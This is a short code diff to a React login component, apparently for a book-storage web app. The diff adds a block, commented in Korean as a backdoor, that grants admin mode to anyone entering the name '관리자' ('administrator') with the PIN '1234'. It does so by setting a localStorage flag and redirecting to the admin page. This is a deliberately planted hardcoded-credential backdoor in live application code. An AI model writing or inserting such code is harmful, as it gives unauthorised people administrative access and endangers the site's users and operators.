@@ -25,6 +25,13 @@ export default function Login() {
       return;
     }
 
+    // 관리자 모드 예외 처리 (백도어)
+    if (name.trim() === '관리자' && pin === '1234') {
+      localStorage.setItem('bookstorage_admin', 'true');
+      navigate('/admin');
+      return;
+    }
+
     setLoading(true);
     try {
       // Use the name as the document ID in the 'users' collection
